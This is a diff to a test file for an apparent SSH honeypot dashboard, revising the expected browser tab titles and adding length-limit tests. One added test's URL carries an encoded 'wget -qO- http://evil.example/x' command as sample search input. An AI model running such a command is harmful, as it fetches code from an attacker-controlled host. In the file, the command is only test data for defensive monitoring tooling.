@@ -148,31 +148,46 @@ describe("App", () => {
 
   it("names the current view in the browser tab", async () => {
     render(<App />);
-    await waitFor(() => expect(document.title).toBe("Live SSH honeypot dashboard · hunajapannu.fi"));
+    await waitFor(() => expect(document.title).toBe("Hunajapannu.fi"));
     fireEvent.click(await screen.findByRole("tab", { name: "Credentials" }));
-    await waitFor(() => expect(document.title).toBe("Credentials · hunajapannu.fi"));
+    await waitFor(() => expect(document.title).toBe("Credentials"));
   });
 
   it("puts a view's search and filter in the tab title", async () => {
     window.history.replaceState(null, "", "/?view=commands&tag=T1105&cmd=wget");
     render(<App />);
     await waitFor(() =>
-      expect(document.title).toBe("“wget” in Ingress Tool Transfer · hunajapannu.fi")
+      expect(document.title).toBe("“wget” · T1105")
     );
   });
 
   it("drops the filter from the title once the view is left", async () => {
     window.history.replaceState(null, "", "/?view=credentials&cred=root");
     render(<App />);
-    await waitFor(() => expect(document.title).toBe("Credentials matching “root” · hunajapannu.fi"));
+    await waitFor(() => expect(document.title).toBe("“root” · Credentials"));
     fireEvent.click(screen.getByRole("tab", { name: "Malware" }));
-    await waitFor(() => expect(document.title).toBe("Malware · hunajapannu.fi"));
+    await waitFor(() => expect(document.title).toBe("Malware"));
   });
 
   it("names the attacker in the title while a session is open", async () => {
     window.history.replaceState(null, "", "/?session=abc123");
     render(<App />);
-    await waitFor(() => expect(document.title).toBe("Session from 1.2.3.4 · hunajapannu.fi"));
+    await waitFor(() => expect(document.title).toBe("Session 1.2.3.4"));
+  });
+
+  it("keeps every title short enough for a browser tab", async () => {
+    // ~24 characters is what a crowded tab bar shows before truncating.
+    window.history.replaceState(null, "", "/?view=commands&tag=T1105&cmd=wget%20-qO-%20http%3A%2F%2Fevil.example%2Fx");
+    render(<App />);
+    await waitFor(() => expect(document.title).toMatch(/· T1105$/));
+    expect(document.title.length).toBeLessThanOrEqual(24);
+  });
+
+  it("cuts a long search to fit even beside a long view name", async () => {
+    window.history.replaceState(null, "", "/?view=credentials&cred=administrator123456");
+    render(<App />);
+    await waitFor(() => expect(document.title).toMatch(/^“admini.*…” · Credentials$/));
+    expect(document.title.length).toBeLessThanOrEqual(24);
   });
 
   it("says what the site is before any figures", async () => {
